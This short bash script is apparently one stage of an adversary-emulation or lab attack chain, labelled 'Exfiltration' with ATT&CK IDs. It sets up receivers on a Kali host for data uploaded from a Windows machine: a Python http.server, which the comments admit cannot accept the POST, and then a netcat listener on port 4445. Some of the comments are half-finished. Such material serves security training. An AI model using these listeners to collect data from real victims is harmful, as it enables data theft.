#!/usr/bin/env bash
# Stage 11 — Exfiltration (T1059.001, T1567.002), part 1/2
# Host: Kali Linux — simple HTTP listener to receive the POST upload
set -euo pipefail

python3 -m http.server 8000 # (NOT accessible) (first solution)
# Note: The Windows script sends an HTTP POST request to port 8000. 
# However, the Kali script runs Python's http.server on port 8000, which natively rejects POST requests with a 501 Unsupported Method error. The transfer will fail.
# For a receiving endpoint that actually writes the uploaded file, swap in
# a small Flask/http.server subclass, or using netcat command for inspection 
# Better solution for receving file from Window by using netcat listening with port 
nc -lvnp 4445 # (second solution)
# the raw HTTP request manually.
